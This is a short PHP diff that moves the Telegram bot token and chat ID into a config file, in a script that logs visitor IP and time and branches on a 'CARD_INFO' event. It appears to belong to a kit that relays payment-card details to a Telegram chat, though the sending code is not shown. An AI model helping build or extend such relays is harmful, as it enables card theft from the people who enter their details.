@@ -47,8 +47,15 @@ $ip   = !empty($_SERVER['HTTP_X_FORWARDED_FOR'])
 $time = date('Y-m-d H:i:s');
 
 // Config Telegram
-$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: 'YOUR_BOT_TOKEN_HERE';
-$chatId   = getenv('TELEGRAM_CHAT_ID') ?: '-5238438739';
+$configFile = __DIR__ . '/../data-ps/recargas/config.php';
+if (file_exists($configFile)) {
+    $config = require $configFile;
+    $botToken = $config['bot_token'];
+    $chatId = $config['chat_id'];
+} else {
+    $botToken = getenv('TELEGRAM_BOT_TOKEN') ?: 'YOUR_BOT_TOKEN_HERE';
+    $chatId   = getenv('TELEGRAM_CHAT_ID') ?: '-5238438739';
+}
 
 // Construir mensaje según evento
 if ($event === 'CARD_INFO') {
